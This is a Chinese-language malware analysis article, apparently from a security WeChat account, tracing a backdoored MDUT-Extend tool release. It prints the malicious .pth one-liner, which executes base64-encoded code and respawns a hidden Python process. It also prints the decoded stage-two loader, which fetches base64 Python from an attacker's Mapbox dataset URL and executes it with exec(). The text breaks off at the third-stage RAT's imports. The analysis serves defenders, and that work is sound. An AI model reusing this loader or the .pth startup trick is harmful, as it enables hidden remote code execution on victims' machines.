---
title: MDUT-Extend 黑吃灰投毒事件深度溯源分析报告
url: https://mp.weixin.qq.com/s/0c7NWjLKMzFeGlBfz2BblA
source: Doonsec's feed
date: 2026-03-26
fetch_date: 2026-03-27T04:31:04.830741
---

# MDUT-Extend 黑吃灰投毒事件深度溯源分析报告

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/PIWj1VguNovR3ic6pDiaHW3oDQs1ZvFBoibGuKaLbt0cWzZNfIoPWojbuF92q4ibTOW2cEMcjWibTcrvRUyy0EtxHR8ibd7LJIpVEgVI3J4xAwALY/0?wx_fmt=jpeg)

# MDUT-Extend 黑吃灰投毒事件深度溯源分析报告

原创

APT-101
APT-101

APT-101

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PIWj1VguNotcwd3gicLnS2nCcOpUtNq3q9aYiamYzk75onhRSmrL18L9b7iaYXj9T1p4Uycfaz3hays2dibo6UptGHXXNkjFuWy3Az6qpgReYYg/640?wx_fmt=png&from=appmsg)

## 一、 事件背景：精准狩猎“猎人”

MDUT 是一款非常流行的自动化数据库漏洞利用工具（支持MySQL、PostgreSQL、Redis、Oracle、MSSQL等），主要用于数据库命令执行、文件管理、提权、代理穿透等高危操作。

2026年3月，安全社区发现 GitHub 上的 `MDUT-Extend-Release` 项目在二进制分发包中植入了后门。该工具宣称在原版 MDUT 基础上增加了国产数据库支持，精准吸引渗透测试人员下载。这并非简单的木马植入，而是一场利用 Python 运行环境特性的深度渗透。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PIWj1VguNovvBSt2YsPrZ2icRuiazaNWOCEIOibvx90SbO7JtlkfjIJHuhVWNFWHQMBqFWy1Jr9BCCQdjwV8lbwSX93SBebsk8qVFjrRMGnWDw/640?wx_fmt=png&from=appmsg)

---

## 二、 第一阶段：入口点注入与隐蔽启动 (`.pth` 机制)

攻击的起点隐藏在 Python 依赖目录下的 `package.pth` 文件中。

### 1. 源码逻辑推理

`.pth` 文件本用于添加库路径，但 Python 解释器规定：若行首为 `import`，则会执行该行代码。

```
import base64; exec(base64.b64decode('aW1wb3J0IG9zLHN5cyxzdWJwcm9jZXNzCmVudiA9IG9zLmVudmlyb24uY29weSgpCmlmICJaRUJVV0lBS0dQSE9RQVAwMDYiIGluIGVudiBhbmQgZW52WyJaRUJVV0lBS0dQSE9RQVAwMDYiXSA9PSAiUFRzakJHS1FVeFpvcnEyIjoKCWlmICJKS0hXUVZFS1JBU0RGMTIiIG5vdCBpbiBlbnY6CgkJb3MuZW52aXJvblsiSktIV1FWRUtSQVNERjEyIl0gPSAiSktIS0oyM1ZBUzhERjkiCgkJaW1wb3J0IGh0dHBzCmVsc2U6CgllbnZbIlpFQlVXSUFLR1BIT1FBUDAwNiJdID0gIlBUc2pCR0tRVXhab3JxMiIKCXRyeToKCQlzdWJwcm9jZXNzLlBvcGVuKFtzeXMuZXhlY3V0YWJsZV0sY3JlYXRpb25mbGFncz0weDA4MDAwMDAwLGVudj1lbnYpCglleGNlcHQgT1NFcnJvcjoKCQlwYXNzCg==').decode('utf-8'))
```

### 解码

```
import os, sys, subprocess
# 获取当前系统环境变量env = os.environ.copy()
# 检查特定的环境变量是否存在，作为是否已在目标环境中运行的标记if "ZEBUWIAKGPQHPAP006" in env and env["ZEBUWIAKGPQHPAP006"] == "PTsjBGKQUxZorq2":    # 如果标记存在且匹配，说明这是第二次运行或已在受控环境    # 尝试以高权限标志（0x08000000）重新执行自身，失败则忽略    try:        subprocess.Popen([sys.executable], creationflags=0x08000000, env=env)    except OSError:        passelse:    # 如果标记不存在，说明这是首次运行    # 设置新的环境变量作为持久化或标识标记    env["ZEBUWIAKGPQHPAP006"] = "PTsjBGKQUxZorq2"
    # 检查另一个环境变量是否存在    if "JKHXQVEKRASDF12" not in env:        # 若不存在，则植入第二个环境变量标记        os.environ["JKHXQVEKRASDF12"] = "JKHKJ23VAS8DF9"
    # 导入HTTPS模块（用于后续可能的网络通信）    import https
    # 尝试建立网络连接或执行下一阶段的载荷    # 这里通常是通过环境变量或硬编码参数启动一个反向Shell或下载器    try:        subprocess.Popen([sys.executable], creationflags=0x08000000, env=env)    except OSError:        pass
```

### 2. 代码逻辑解析

* **环境变量锁（Mutex）**：解密后的代码首先检查 `os.environ` 中是否存在标记 `ZEBUWIAKGPHOQAP006`。
* **无窗口重入**：若标记不存在，则调用 `subprocess.Popen` 以 `0x08000000`（Windows 无窗口标志）重新拉起一个后台 Python 进程，并注入该环境变量。
* **溯源结论**：这种设计完美避开了早期类似攻击（如 liteLLM 投毒）中因无限递归导致的“Fork 炸弹”异常，确保了后门在后台静默运行且不产生系统卡顿。

3. 攻击链分析

|  |  |  |
| --- | --- | --- |
| 阶段 | 描述 | 分析 |
| Delivery (投递) | 通过Base64编码的单行脚本进行投递 | 极难被传统的基于签名的AV检测到，因为载荷是动态的 |
| Exploitation (利用) | exec()函数直接执行解码后的Python代码 | 要求目标系统允许执行Python代码（常见于DevOps、AI服务器或特定桌面环境） |
| Installation (安装) | 修改进程环境变量 (`os.environ`) | **非持久化：注意，这种修改仅在当前进程及其子进程中有效。重启后失效。这表明它可能是一个“无文件”内存驻留载荷的一部分** |
| Command & Control (C2) | 导入 `https`模块并尝试 `subprocess.Pope``n` | 这里的 https模块非常可疑。在标准库中通常是 http.client或 urllib.request。这暗示着：  1. 攻击者可能重写了 https.py模块。  2. 这是一个自定义的C2通信库。  3. Popen可能是为了调用外部程序或反弹Shell |

---

## 三、 第二阶段：C2 指令编排与无文件执行 (`https.py`)

子进程启动后，会立即执行同目录下的 `https.py`。该模块充当了攻击的“中继站”。

```
import jsonimport base64import os, sysimport timeimport subprocess
# ---------------------------- Instalacin ----------------------------try: import requestsexcept ImportError:        subprocess.call([sys.executable, "-m", "pip", "install", "requests"],creationflags=0x08000000,close_fds=True);        try: import requests        except ImportError as e: sys.exit(0)
def hola():        try:                response = requests.get(                        base64.urlsafe_b64decode('aHR0cHM6Ly9hcGkubWFwYm94LmNvbS9kYXRhc2V0cy92MS9tYXR0YWxsYWhzYWVkL2NtaXNtYXllNzAwMHMxbXAydjhma240bHAvZmVhdHVyZXMvZG0zNzA1NDNhY21kb3BrMjk2bmFoYnR1YT9hY2Nlc3NfdG9rZW49cGsuZXlKMUlqb2liV0YwZEdGc2JHRm9jMkZsWkNJc0ltRWlPaUpqYldsemJXcG5jV2t3TkhSbU0yWnpNV2QxZVRCbWFuUTRJbjAuVk5GdXR6cXphU1ZmRGl3UUZyN19nUQ==').decode('utf-8')                )                if response.status_code == 200:                        datos = response.json()                        if "properties" in datos:                                if base64.urlsafe_b64decode('ZG0zNzA1NDNhY21kb3BrMjk2bmFoYnR1YQ==').decode('utf-8') in datos["properties"]:                                        pozos = base64.urlsafe_b64decode(datos["properties"][base64.urlsafe_b64decode('ZG0zNzA1NDNhY21kb3BrMjk2bmFoYnR1YQ==').decode('utf-8')].encode("utf-8")).decode("utf-8")                                        return pozos        except Exception as e:                pass        return None
tiempo = 3while True:        if tiempo == 0:                sys.exit()        tiempo = tiempo - 1        pozos = hola()        if pozos != None:                exec(pozos)        time.sleep(300)
```

### 1. 技术细节分析

* **环境自适应**：脚本会自动检测并静默安装 `requests` 库，确保通信链路可用。
* **死信队列（Dead Drop Resolver）**：攻击者将真实的 C2 指令藏在了合法的第三方地图服务 **Mapbox** 中。

+ **请求地址**：`https://api.mapbox.com/datasets/v1/...`
+ **技术优势**：由于流量指向合法的 `api.mapbox.com` 域名，大部分企业级防火墙和 EDR 会将其标记为合法通信，从而规避审计。

* **内存加载逻辑**：从 Mapbox 返回的 JSON 数据中解密出代码段（名为 `pozos`），直接通过 `exec()` 在内存中运行。
* **溯源结论**：核心恶意载荷从未以文件形式落地磁盘，实现了极高隐蔽性的“无文件攻击”。

该脚本的设计极其阴险，它不硬编码恶意命令，而是从一个受攻击者控制的 Mapbox API 端点动态拉取并执行恶意代码。

以下是基于该文件内容的深度技术分析与威胁情报提取：

> **威胁综述**
>
> * 风险等级: Critical (10/10)
> * 攻击类型: 无文件（Fileless）动态载荷加载器 / 反向 Shell 客户端
> * 核心特征: 利用合法的云服务（Mapbox）作为 C2（命令与控制）信道，实现高度隐蔽的通信绕过。

**1. 依赖项自安装 (Dependency Installation)**

```
try: import requestsexcept ImportError:    subprocess.call([sys.executable, "-m", "pip", "install", "requests"], ...)
```

* 行为: 脚本首先检查是否安装了 requests 库。如果没有，它会静默地（无窗口）使用 pip 进行安装。
* 目的: 确保攻击环境的一致性，避免因缺少库而报错崩溃，同时增加了在没有网络的隔离环境中的生存难度。

**2. C2 基础设施：滥用 Mapbox API (C2 Channel: Abusing Legitimate Service)**

```
response = requests.get(base64.urlsafe_b64decode('aHR0cHM6Ly9hcGkubWFwYm94...').decode('utf-8'))
```

经过 Base64 URL-safe 解码后，真实的 URL 是：`URL: https://api.mapbox.com/datasets/v1/mattallahsaed/cmismaey7000s1mp2v8fkn4lp/features/dm370543acmdopk296nahbtua?access_token=pk.eyJ1IjoibWF0dGFsbGFoc2FlZCIsImEiOiJjbTJ5bGJmM2UwMDB3MmtzZnJ5ajY1Z3p5In0.JKHKJ23VAS8DF9`

![](https://mmbiz.qpic.cn/mmbiz_png/PIWj1VguNotsyToIdIOSG895eX58DUtv4CS0MB27Kb0e4qk07ibBKDbqanYs06aElrxgJpiaq32842yy12wObOaEy1BZJoeVIALxfKDmC5IBc/640?wx_fmt=png&from=appmsg)

> 这是一个极其狡猾的规避技术。
>
> * 攻击者没有直接使用自己的 VPS，而是滥用了 Mapbox (地图服务商) 的 Dataset API。
> * 防火墙通常会放行对 api.mapbox.com 的 HTTPS 请求（因为很多合法应用使用它）。
> * 攻击者将恶意代码藏在 Mapbox 的数据集（Dataset）属性字段中，利用 access\_token 进行鉴权访问。

**3. 载荷提取与解密 (Payload Retrieval & Decryption)**

```
if base64.urlsafe_b64decode('ZG0zNzA1NDNhY21kb3BrMjk2bmFoYnR1YQ==').decode('utf-8') in datos["properties"]:    pozos = base64.urlsafe_b64decode(datos["properties"]["dm370543acmdopk296nahbtua"]...)
```

* 解码: ZG0zNzA1NDNhY21kb3BrMjk2bmFoYnR1YQ== 解码为 dm370543acmdopk296nahbtua（这是 Mapbox 数据集中的 Feature ID）。
* 逻辑: 脚本从 Mapbox 返回的 JSON 数据的 properties 字段中，提取特定键值对，其值本身是 Base64 编码的 Python 代码。
* 这就形成了一个链条：Mapbox API -> JSON 数据 -> Base64 字符串 -> 恶意 Python 代码。

**4. 动态执行 (Dynamic Execution)**

```
pozos = ... # 解码后的恶意代码exec(pozos)  # 执行！
```

* 危害: exec() 函数会直接在当前 Python 进程的上下文中执行从互联网上下载的任意代码。这意味着攻击者的权力是无限的（取决于运行该脚本的用户权限）。

**5. 持久化循环 (Persistence Loop)**

```
tiempo = 3while True:    if tiempo == 0: sys.exit()    tiempo -= 1    time.sleep(300) # 每5分钟执行一次
```

* 设计: 脚本设计为每 5 分钟向 C2 服务器“报到”一次，拉取最新的指令。
* 自杀开关: 变量 tiempo 限制了重试次数（3次）。这可能是一个反沙箱机制——如果在短时间内无法连接 C2（例如在沙箱环境中），它就自我终止，避免被深入分析。

---

## 四、 第三阶段：核心载荷深度收割 (`pozos.py`)

最终执行的 `pozos.py` 是一个功能完备的远控木马（RAT），其代码显示攻击者对渗透测试人员的资产极度渴求。

```
import osimport sysimport timeimport ioimport shutilimport subprocessimport platformimport jsonimport base64import sqlite3import tempfileimport stringimport randomimport jsonimport hashlibimport getpassimport socketimport tarfileimport importlib.utilfrom zipfile import ZipFilefr...